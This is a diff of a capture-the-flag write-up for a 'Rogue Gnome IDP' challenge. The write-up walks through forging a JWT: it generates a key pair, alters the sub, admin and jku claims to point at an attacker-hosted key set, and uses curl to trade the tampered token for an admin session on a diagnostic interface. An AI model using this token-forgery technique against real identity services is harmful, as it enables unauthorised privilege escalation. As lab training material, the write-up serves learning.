@@ -114,6 +114,9 @@ The /etc/passwd file is accessible. The username "santa" looks like a good one t
 ![Contents of the Password file](/images/roguegnomeidp_passwdfile.jpg) 
  
 Using mkjwk - JSON Web Key Generator, generate the json web key:
+
+![Generating JSON Web Key](/images/roguegnomeidp_keys.jpg) 
+
 ``` 
 e: AQAB
 n: hJwH0hvuZC3HVpQocwmk76t8wQQOXWETMHnRuP_GlUHYpNZOQv2CKf2PAKLqD3uHubsdB8MPRPER2qqcIFKg9kR_CZBeEQkheALPCd6jNfPjqX7ic-PYB5VMXiV86QK6dxw9ecJUkKa5Ub_mK_KdCX03o0r-lZxsqxL_19Rv2eF8BEzWxClm_HFEaaJ3006MKjB6m2gM4eCezhywZOtJw0aZhpImD8VroPhMZ24OB-ml3jkCJfzHkMz8gybbIuxCTpcIcgf3U3H7lw7HiH2GdwT67yF03P3KMYTwjkCxpvueP9sFFmQpBcfocvkj2U1irLfZ9tbNJqKYuPNSd8H3_w
@@ -127,7 +130,8 @@ n: hJwH0hvuZC3HVpQocwmk76t8wQQOXWETMHnRuP_GlUHYpNZOQv2CKf2PAKLqD3uHubsdB8MPRPER2
     "n": "hJwH0hvuZC3HVpQocwmk76t8wQQOXWETMHnRuP_GlUHYpNZOQv2CKf2PAKLqD3uHubsdB8MPRPER2qqcIFKg9kR_CZBeEQkheALPCd6jNfPjqX7ic-PYB5VMXiV86QK6dxw9ecJUkKa5Ub_mK_KdCX03o0r-lZxsqxL_19Rv2eF8BEzWxClm_HFEaaJ3006MKjB6m2gM4eCezhywZOtJw0aZhpImD8VroPhMZ24OB-ml3jkCJfzHkMz8gybbIuxCTpcIcgf3U3H7lw7HiH2GdwT67yF03P3KMYTwjkCxpvueP9sFFmQpBcfocvkj2U1irLfZ9tbNJqKYuPNSd8H3_w"
 }
 ```
-Create the PEM file from the JSON Web Key using jwk to pem convertor
+Create the PEM file from the JSON Web Key using jwk to pem convertor (https://8gwifi.org/jwkconvertfunctions.jsp)
+
 ```
 -----BEGIN RSA PRIVATE KEY-----
 MIIEowIBAAKCAQEAhJwH0hvuZC3HVpQocwmk76t8wQQOXWETMHnRuP/GlUHYpNZO
@@ -166,47 +170,33 @@ dwT67yF03P3KMYTwjkCxpvueP9sFFmQpBcfocvkj2U1irLfZ9tbNJqKYuPNSd8H3
 /wIDAQAB
 -----END PUBLIC KEY-----
 ```
-Using JWT.io change the minimal number of items. The hint says gnome has insufficient permission, so we must change sub, admin and jku:
- 
+Using JWT.io change the minimal number of items. The hint says gnome has insufficient permission, so we must change sub, admin and jku.
+
+- sub changes from "gnome" to "santa"
+
+- admin changes from "false" to "true"
+
+- jku changes from "http://idp.atnascorp/.well-known/jwks.json" to "http:/paulweb.neighborhood/jwks.json"
+
+The token is signed using the Private key generated. The public key and the fraudulent JSON file is placed in the www directory of paulweb.neighborhood.
+
+![Creating a Tampered Token](/images/roguegnomeidp_tamperedjwt.jpg)  
 
 Tampered token:
 ```
 eyJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9wYXVsd2ViLm5laWdoYm9yaG9vZC9qd2tzLmpzb24iLCJraWQiOiJpZHAta2V5LTIwMjUiLCJ0eXAiOiJKV1QifQ.eyJzdWIiOiJzYW50YSIsImlhdCI6MTc2MjgxNjQ0NSwiZXhwIjoxNzYyODIzNjQ1LCJpc3MiOiJodHRwOi8vaWRwLmF0bmFzY29ycC8iLCJhZG1pbiI6dHJ1ZX0.SHLrimPcjayFmHcgSAebHW_iLP1HErl_ce_NCoM2N4qGtOLmjzKUSFmahHECCW5ax0D2DEsAU77ghYjXTfOAOteLxeIlDs9csn0FMBzLCqROWRjW8setWVlfd0T98jwhopj78uk3pcRmkzuDH9gAUt46c3qic9y34LpEJm6DICh2h76UTlBVowIfbHr3KMDoernoFHThKPUEqEoEaredjt31xuQbDoZ844IPciovLnF9D83cbZoCzki0U93xfPuUAQszILY5iku76AhjCF6QTu25oXIxHs5MXn7wi6Pl5VlHLndz3S2bbnI5NnaVwtjpw7p33VfAYP-4fGvGdEMASA
 ```
-Pass Auth Token to Gnome and get a session key
+Now the tampered token is passed to gnome for a valid session key:
 ```
 curl -v http://gnome-48371.atnascorp/auth?token=eyJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9wYXVsd2ViLm5laWdoYm9yaG9vZC9qd2tzLmpzb24iLCJraWQiOiJpZHAta2V5LTIwMjUiLCJ0eXAiOiJKV1QifQ.eyJzdWIiOiJzYW50YSIsImlhdCI6MTc2MjgxNjQ0NSwiZXhwIjoxNzYyODIzNjQ1LCJpc3MiOiJodHRwOi8vaWRwLmF0bmFzY29ycC8iLCJhZG1pbiI6dHJ1ZX0.SHLrimPcjayFmHcgSAebHW_iLP1HErl_ce_NCoM2N4qGtOLmjzKUSFmahHECCW5ax0D2DEsAU77ghYjXTfOAOteLxeIlDs9csn0FMBzLCqROWRjW8setWVlfd0T98jwhopj78uk3pcRmkzuDH9gAUt46c3qic9y34LpEJm6DICh2h76UTlBVowIfbHr3KMDoernoFHThKPUEqEoEaredjt31xuQbDoZ844IPciovLnF9D83cbZoCzki0U93xfPuUAQszILY5iku76AhjCF6QTu25oXIxHs5MXn7wi6Pl5VlHLndz3S2bbnI5NnaVwtjpw7p33VfAYP-4fGvGdEMASA
 ```
-Use the session key to connect to the diagntic interface:
+The session key is used to connect to the diagntic interface:
 ```
 curl -H 'Cookie: session=eyJhZG1pbiI6dHJ1ZSwidXNlcm5hbWUiOiJzYW50YSJ9.aRJ4Fw.oA20V3TpQ5ST2sky_K3XDsllPSs; ' http://gnome-48371.atnascorp/diagnostic-interface
 ```
- 
+![Getting the Diagnostic Interface](/images/roguegnomeidp_diagnostic.jpg)   
 
-Answer: refrigeration-botnet.bin
-Thanks to eucrates (suggested website)
-)
-  
-![Sample image alt text](/images/objectivename_purpose.jpg) 
-
-
-```sh
-bash script code block
-```
-
-Ordered list:
-1. Item 1
-2. Item 2
-3. Item 3
-
-Unordered list:
-
-- Item
-- Item
-- Item
-/usr/local/weather/temperature
-
-**Answer: Flag or Answer**
+**Answer:refrigeration-botnet.bin**
 
 </details>
 
@@ -214,9 +204,10 @@ Unordered list:
 
 | Tools Used           | Tool Version |
 | :-----------------------: | :--------------------------------: |
-|  |  | 
-|  |  |
-|  |  | 
+| curl |  | 
+| JWT.IO | N/A |
+| https://8gwifi.org/jwkconvertfunctions.jsp | N/A  | 
+| https://mkjwk.org/ | N/A  |
 
 ## Hints Reference
 | Provided By         | Hint |
@@ -229,7 +220,7 @@ Unordered list:
 ## Acknowledgements
 | Provided By         | Notes |
 | :-----------------------: | :--------------------------------: |
-| eucrates |  |
+| eucrates | suggested using the jwk to pem convertor website (https://8gwifi.org/jwkconvertfunctions.jsp) |
 
 
 |[Previous Objective: Act2 Dosis Network Down](/act2_dosis_network_down_mjd.md)  |   [Table of Contents](/index.md) | [Next Objective: Act2 Quantgnome Leap](/act2_quantgnome_leap_mjd.md)
